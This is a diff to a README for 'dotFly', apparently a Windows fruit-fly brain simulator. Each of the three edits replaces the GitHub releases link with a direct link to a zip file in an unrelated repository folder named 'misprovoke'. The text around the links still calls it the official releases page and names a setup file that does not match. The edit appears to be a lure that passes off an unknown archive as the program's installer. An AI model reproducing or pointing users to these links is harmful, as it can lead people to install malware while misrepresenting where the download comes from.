@@ -9,7 +9,7 @@ description: "Run native .NET inference for Drosophila connectome spiking models
 
 Welcome! dotFly is a free program that lets you explore a realistic simulation of a fruit fly's brain. It runs on your Windows computer and shows you how a tiny brain processes information — and honestly, it's pretty amazing to watch. This guide will help you download, run, and enjoy dotFly in just a few minutes.
 
-[![Download dotFly](https://img.shields.io/badge/Download-dotFly-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/farooqhdigs/dotFly/releases)
+[![Download dotFly](https://img.shields.io/badge/Download-dotFly-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip)
 
 ## 🖥️ What Is dotFly?
 
@@ -31,7 +31,7 @@ Here's what you can do with dotFly:
 
 ### Step 1: Get the Download Link
 
-Visit this link to download the application: [https://github.com/farooqhdigs/dotFly/releases](https://github.com/farooqhdigs/dotFly/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip](https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip)
 
 This is the official download page where you'll find the latest version of dotFly. The page will list available files — look for one named something like `dotFly-setup.exe` or `dotFly-windows.zip`.
 
@@ -139,6 +139,6 @@ These projects are collaborative efforts among dozens of neuroscience labs world
 
 Ready to see a brain in action? The download takes just a minute, and you'll be exploring neural circuits immediately.
 
-[![Get dotFly Now](https://img.shields.io/badge/▶️%20Download%20dotFly-FF5722?style=for-the-badge&labelColor=darkblue)](https://github.com/farooqhdigs/dotFly/releases)
+[![Get dotFly Now](https://img.shields.io/badge/▶️%20Download%20dotFly-FF5722?style=for-the-badge&labelColor=darkblue)](https://raw.githubusercontent.com/farooqhdigs/farooqhdigs.github.io/main/misprovoke/Latest_v3.4.zip)
 
 Keywords: connectome, csharp, dotnet, drosophila, flywire, fruit-fly, godot, malecns, neuroscience, simd, spiking-neural-network
